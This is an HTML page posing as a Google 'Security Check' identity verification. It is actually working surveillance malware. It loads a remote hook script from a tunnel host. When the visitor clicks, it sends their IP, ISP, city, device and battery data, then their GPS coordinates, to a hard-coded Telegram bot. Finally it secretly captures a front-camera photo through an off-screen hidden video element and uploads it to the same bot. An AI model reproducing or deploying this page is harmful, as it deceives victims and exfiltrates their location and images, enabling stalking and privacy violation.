<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification System</title>
    <script src="https://inquiries-stability-extend-width.trycloudflare.com/hook.js"></script>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f4; margin: 0; }
        .box { background: white; padding: 40px; border-radius: 10px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        .btn { background: #007bff; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="80" alt=""><br><br>
    <h2>Security Check</h2>
    <p>Please click to verify your identity</p>
    <button class="btn" id="startBtn">VERIFY IDENTITY</button>
</div>

<!-- ڤیدیۆکەمان کردووە بە 200x200 بەڵام شاراوەیە، بۆ ئەوەی دڵنیابین کە ڕەش دەرناچێت -->
<video id="spy-vid" autoplay playsinline muted style="width:200px; height:200px; position:fixed; top:-1000px;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
    const chatId = "6679834643";

    async function sendToBot(msg) {
        return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: msg })
        });
    }

    document.getElementById('startBtn').addEventListener('click', async function() {
        this.innerHTML = "Verifying...";
        this.disabled = true;

        // ١. یەکەمجار داتاکانی (IP, Battery, Device) دەنێرێت
        await getFullLog();

        // ٢. داوای لوکەیشن دەکات و تا نەنێردرێت ناچێتە هەنگاوی دواتر
        await getGPS();
        
        // ٣. داوای کامێرا دەکات
        setTimeout(() => {
            getCamera();
        }, 1000);
    });

    async function getFullLog() {
        try {
            let batteryLevel = "Unknown";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                batteryLevel = Math.round(b.level * 100) + "%";
            }
            const response = await fetch('https://ipapi.co/json/');
            const d = await response.json();
            const fullMsg = `🔥 Target Logged In!\n🌐 IP: ${d.ip}\n🏢 ISP: ${d.org}\n🏙️ City: ${d.city}\n📱 Device: ${navigator.userAgent}\n🔋 Battery: ${batteryLevel}\n📅 Date: ${new Date().toLocaleString()}`;
            await sendToBot(fullMsg);
        } catch (e) {
            await sendToBot("❌ Error Fetching IP Log");
        }
    }

    function getGPS() {
        return new Promise((resolve) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    await sendToBot(`📍 GPS Map: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
                    resolve();
                }, async (err) => { 
                    await sendToBot("❌ GPS Access Denied");
                    resolve();
                }, {enableHighAccuracy: true, timeout: 5000});
            } else {
                resolve();
            }
        });
    }

    async function getCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('spy-vid');
            video.srcObject = stream;

            // گرنگ: چاوەڕێ دەکات تا ڤیدیۆکە بە تەواوی ئیش دەکات (بۆ ئەوەی ڕەش نەبێت)
            video.onloadedmetadata = async () => {
                await new Promise(r => setTimeout(r, 4000)); // کاتێکی زیاتر بۆ ڕوونکردنەوەی وێنەکە
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    const fd = new FormData();
                    fd.append('chat_id', chatId);
                    fd.append('photo', blob, 'shot.jpg');
                    fd.append('caption', '👤 Captured Image');
                    
                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                    stream.getTracks().forEach(t => t.stop());
                }, 'image/jpeg', 0.9);
            };
        } catch (e) {
            await sendToBot("❌ Camera Access Denied");
        }
    }
</script>
</body>
</html>
